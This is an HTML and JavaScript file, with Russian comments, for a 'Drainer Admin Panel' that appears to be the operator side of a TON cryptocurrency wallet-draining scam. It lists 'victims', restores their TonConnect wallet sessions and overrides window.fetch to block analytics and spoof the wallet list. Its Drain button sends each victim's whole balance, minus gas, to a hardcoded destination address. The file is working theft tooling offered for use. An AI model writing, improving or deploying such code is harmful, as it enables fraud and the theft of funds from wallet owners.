<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Drainer Admin Panel</title>
    <script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.4.4/dist/tonconnect-ui.min.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            min-height: 100vh;
            background: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .background {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0;
            background: radial-gradient(circle at 20% 50%, #1a1a2e 0%, #0a0a0a 50%);
        }
        .background::before {
            content: "";
            position: absolute; top: -50%; left: -50%; width: 200%; height: 200%;
            background: conic-gradient(from 0deg at 50% 50%,
                rgba(240,185,11,0.1) 0deg, transparent 60deg,
                rgba(240,185,11,0.05) 120deg, transparent 180deg,
                rgba(240,185,11,0.1) 240deg, transparent 300deg,
                rgba(240,185,11,0.05) 360deg);
            animation: rotate 20s linear infinite; z-index: -1;
        }
        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }

        .login-box, .panel {
            position: relative; z-index: 1;
            background: rgba(20,20,30,0.9); backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.15); border-radius: 24px;
            padding: 30px; max-width: 400px; width: 100%;
            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
        }
        .panel { max-width: 700px; display: none; }

        h2 { color: #f0b90b; text-align: center; margin-bottom: 20px; }
        label { color: #ccc; font-size: 0.9rem; }
        input[type="password"] {
            width: 100%; padding: 12px; margin-top: 5px; margin-bottom: 15px;
            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
            border-radius: 10px; color: white; font-size: 1rem;
        }
        button {
            background: linear-gradient(90deg, #f0b90b, #ff8c00);
            border: none; padding: 12px 24px; border-radius: 10px;
            font-weight: 700; cursor: pointer; transition: 0.3s; width: 100%;
        }
        button:hover { box-shadow: 0 4px 15px rgba(240,185,11,0.5); }
        .error { color: #ff5252; text-align: center; margin-top: 10px; }

        table { width: 100%; border-collapse: collapse; margin-top: 20px; color: #ddd; font-size: 0.85rem; }
        th, td { padding: 12px 8px; border-bottom: 1px solid rgba(255,255,255,0.1); }
        th { color: #f0b90b; text-transform: uppercase; font-size: 0.75rem; }
        .address-cell { font-family: monospace; font-size: 0.8rem; word-break: break-all; }
        .balance-cell { font-weight: 600; color: #f0b90b; }
        .active-status { color: #4caf50; font-weight: 600; }
        .drain-btn {
            background: #e53935; color: white; border: none; padding: 8px 14px;
            border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.2s;
        }
        .drain-btn:disabled { background: #555; cursor: not-allowed; }
        .drain-btn:hover:not(:disabled) { background: #ff5252; }
        .refresh-btn {
            background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2);
            color: #ccc; padding: 8px 14px; border-radius: 8px; font-weight: 600;
            cursor: pointer; margin-bottom: 15px;
        }
        .msg { text-align: center; color: #f0b90b; margin-top: 15px; min-height: 20px; }
    </style>
</head>
<body>
    <div class="background"></div>

    <!-- Форма входа -->
    <div class="login-box" id="loginBox">
        <h2>🔐 Admin Login</h2>
        <label>Password</label>
        <input type="password" id="password" placeholder="Enter password">
        <button id="loginBtn">Login</button>
        <div class="error" id="loginError"></div>
    </div>

    <!-- Панель управления -->
    <div class="panel" id="adminPanel">
        <h2>🛠️ Drainer Control Panel</h2>
        <div style="text-align: right;">
            <button class="refresh-btn" id="refreshBalances">🔄 Refresh Balances</button>
        </div>
        <table>
            <thead>
                <tr>
                    <th>Wallet Address</th>
                    <th>Balance (TON)</th>
                    <th>Status</th>
                    <th>Action</th>
                </tr>
            </thead>
            <tbody id="tableBody">
                <tr><td colspan="4" style="text-align:center;">No victims loaded.</td></tr>
            </tbody>
        </table>
        <div class="msg" id="adminMsg"></div>
    </div>

    <script>
        (function() {
            // ================== Авторизация ==================
            const loginBox = document.getElementById('loginBox');
            const adminPanel = document.getElementById('adminPanel');
            const loginError = document.getElementById('loginError');
            const passwordInput = document.getElementById('password');
            const loginBtn = document.getElementById('loginBtn');

            const VALID_PASSWORD = 'admin123'; // пароль админа

            loginBtn.addEventListener('click', () => {
                if (passwordInput.value === VALID_PASSWORD) {
                    loginBox.style.display = 'none';
                    adminPanel.style.display = 'block';
                    initAdminPanel(); // запускаем панель
                } else {
                    loginError.textContent = 'Incorrect password!';
                }
            });

            // ================== Админ-панель ==================
            function initAdminPanel() {
                if (typeof TON_CONNECT_UI === 'undefined') {
                    document.getElementById('adminMsg').innerText = '❌ TonConnect library not loaded.';
                    return;
                }

                // Конфигурация (такая же, как в index.html)
                const DESTINATION_ADDRESS = 'UQBiTR-x4quXNhtXj1I1e1bs8tUeQspQru7HCoPmj76IqmlL';
                const MANIFEST_URL = 'https://nwealesss.github.io/draintest/tonconnect-manifest.json';

                const walletsList = [
                    { name: 'Tonkeeper', image: 'https://tonkeeper.com/assets/tonconnect-icon.png', aboutUrl: 'https://tonkeeper.com', bridgeUrl: 'https://bridge.tonkeeper.com/bridge', universalLink: 'https://app.tonkeeper.com/ton-connect', deepLink: 'tonkeeper-tc://', injected: false },
                    { name: 'Tonhub', image: 'https://tonhub.com/tonconnect-icon.png', aboutUrl: 'https://tonhub.com', bridgeUrl: 'https://connect.tonhub.com/bridge', universalLink: 'https://tonhub.com/ton-connect', deepLink: 'tonhub-tc://', injected: false },
                    { name: 'MyTonWallet', image: 'https://mytonwallet.io/icon-256.png', aboutUrl: 'https://mytonwallet.io', bridgeUrl: 'https://bridge.mytonwallet.org/bridge', universalLink: 'https://mytonwallet.io/ton-connect', deepLink: 'mytonwallet-tc://', injected: false },
                    { name: 'OpenMask', image: 'https://openmask.app/icon.png', aboutUrl: 'https://openmask.app', bridgeUrl: 'https://bridge.openmask.app/bridge', universalLink: 'https://openmask.app/ton-connect', deepLink: 'openmask-tc://', injected: false }
                ];

                // Перехват fetch (аналогично index.html)
                const originalFetch = window.fetch;
                window.fetch = function(url, ...args) {
                    const urlStr = typeof url === 'string' ? url : url.url;
                    if (urlStr.includes('analytics.ton.org')) return Promise.resolve(new Response('{}', { status: 200 }));
                    if (urlStr.includes('config.ton.org/wallets-v2.json')) return Promise.resolve(new Response(JSON.stringify(walletsList), { status: 200, headers: { 'Content-Type': 'application/json' } }));
                    return originalFetch.call(this, url, ...args);
                };

                const tableBody = document.getElementById('tableBody');
                const adminMsg = document.getElementById('adminMsg');
                let activeWallet = null; // текущий активный кошелёк

                // Инициализация TonConnectUI (восстанавливает сессию жертвы)
                const connector = new TON_CONNECT_UI.TonConnectUI({
                    manifestUrl: MANIFEST_URL,
                    buttonRootId: 'dummy', // кнопка не нужна, но обязательна для конструктора
                    network: 'mainnet',
                    walletsList: walletsList,
                    enableAnalytics: false
                });

                // Скрываем кнопку
                document.getElementById('dummy')?.style.display === 'none';

                // Обработка изменения статуса подключения
                connector.onStatusChange(async (wallet) => {
                    activeWallet = wallet;
                    await renderVictimsTable();
                });

                // Запрос баланса адреса
                async function fetchBalance(address) {
                    const apiUrl = `https://toncenter.com/api/v2/getAddressBalance?address=${address}`;
                    const proxies = [
                        `https://corsproxy.io/?${encodeURIComponent(apiUrl)}`,
                        `https://api.allorigins.win/raw?url=${encodeURIComponent(apiUrl)}`
                    ];
                    for (let proxy of proxies) {
                        try {
                            const resp = await originalFetch(proxy);
                            if (!resp.ok) continue;
                            const data = await resp.json();
                            if (data.ok) return BigInt(data.result);
                        } catch(e) {}
                    }
                    throw new Error('All proxies failed.');
                }

                // Отрисовка таблицы жертв
                async function renderVictimsTable() {
                    const victims = JSON.parse(localStorage.getItem('drainer_victims') || '[]');
                    if (victims.length === 0) {
                        tableBody.innerHTML = '<tr><td colspan="4" style="text-align:center;">No victims found.</td></tr>';
                        return;
                    }

                    let rows = '';
                    for (let addr of victims) {
                        const isActive = activeWallet && activeWallet.account.address === addr;
                        let balanceStr = '...';
                        if (isActive) {
                            try {
                                const bal = await fetchBalance(addr);
                                balanceStr = (Number(bal) / 1e9).toFixed(4);
                            } catch(e) {}
                        }
                        rows += `
                            <tr>
                                <td class="address-cell">${addr}</td>
                                <td class="balance-cell">${balanceStr}</td>
                                <td class="${isActive ? 'active-status' : ''}">${isActive ? 'Active' : 'Inactive'}</td>
                                <td>
                                    <button class="drain-btn" ${!isActive ? 'disabled' : ''} data-address="${addr}">Drain</button>
                                </td>
                            </tr>
                        `;
                    }
                    tableBody.innerHTML = rows;

                    // Обработчики кнопок Drain
                    document.querySelectorAll('.drain-btn').forEach(btn => {
                        btn.addEventListener('click', async (e) => {
                            const addr = e.target.dataset.address;
                            if (!activeWallet || activeWallet.account.address !== addr) {
                                adminMsg.innerText = '❌ Wallet not active.';
                                return;
                            }
                            await drainCurrentWallet();
                        });
                    });
                }

                // Функция дренажа активного кошелька
                async function drainCurrentWallet() {
                    if (!activeWallet) {
                        adminMsg.innerText = '❌ No active wallet.';
                        return;
                    }
                    const addr = activeWallet.account.address;
                    adminMsg.innerText = '⏳ Fetching balance...';
                    try {
                        const balance = await fetchBalance(addr);
                        const gasReserve = BigInt(50000000); // 0.05 TON
                        const amountToDrain = balance > gasReserve ? balance - gasReserve : BigInt(0);
                        if (amountToDrain <= 0) {
                            adminMsg.innerText = '❌ Balance too low.';
                            return;
                        }

                        const transaction = {
                            validUntil: Math.floor(Date.now() / 1000) + 600,
                            network: activeWallet.account.chain,
                            messages: [{
                                address: DESTINATION_ADDRESS,
                                amount: amountToDrain.toString(),
                                payload: ''
                            }]
                        };

                        adminMsg.innerText = '⏳ Sending drain transaction...';
                        await connector.sendTransaction(transaction);
                        adminMsg.innerText = '✅ Drain transaction sent! Victim must confirm.';
                        await renderVictimsTable(); // обновим баланс
                    } catch(e) {
                        adminMsg.innerText = '❌ Error: ' + e.message;
                    }
                }

                // Кнопка обновления балансов
                document.getElementById('refreshBalances').addEventListener('click', async () => {
                    adminMsg.innerText = '🔄 Updating balances...';
                    await renderVictimsTable();
                    adminMsg.innerText = '✅ Balances refreshed.';
                });

                // Первичная загрузка
                adminMsg.innerText = 'Restoring wallet session...';
                renderVictimsTable();
            }
        })();
    </script>
</body>
</html>
